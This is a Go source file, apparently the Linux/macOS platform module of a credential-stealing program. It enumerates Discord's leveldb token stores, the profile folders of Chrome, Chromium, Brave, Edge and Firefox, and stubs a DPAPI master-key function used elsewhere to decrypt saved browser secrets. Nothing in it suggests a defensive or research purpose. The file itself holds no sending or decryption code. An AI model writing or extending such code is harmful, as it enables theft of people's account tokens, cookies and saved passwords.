//go:build !windows

package main

import (
	"errors"
	"os"
	"path/filepath"
)

func discordDataDirs() []string {
	home, _ := os.UserHomeDir()
	var dirs []string
	for _, name := range []string{"discord", "discordcanary", "discordptb"} {
		dirs = append(dirs, filepath.Join(home, ".config", name, "Local Storage", "leveldb"))
	}
	dirs = append(dirs, filepath.Join(home, ".var", "app", "com.discordapp.Discord", "config", "discord", "Local Storage", "leveldb"))
	return dirs
}

type browserEntry struct {
	name        string
	userDataDir string
}

func chromiumBrowsers() []browserEntry {
	home, _ := os.UserHomeDir()
	return []browserEntry{
		{"chrome", filepath.Join(home, ".config", "google-chrome")},
		{"chromium", filepath.Join(home, ".config", "chromium")},
		{"brave", filepath.Join(home, ".config", "BraveSoftware", "Brave-Browser")},
		{"edge", filepath.Join(home, ".config", "microsoft-edge")},
	}
}

func firefoxProfiles() []string {
	home, _ := os.UserHomeDir()
	base := filepath.Join(home, ".mozilla", "firefox")
	entries, err := os.ReadDir(base)
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		if e.IsDir() {
			out = append(out, filepath.Join(base, e.Name()))
		}
	}
	return out
}

func masterKey(stateDir string) ([]byte, error) {
	return nil, errors.New("dpapi unavailable on this platform")
}
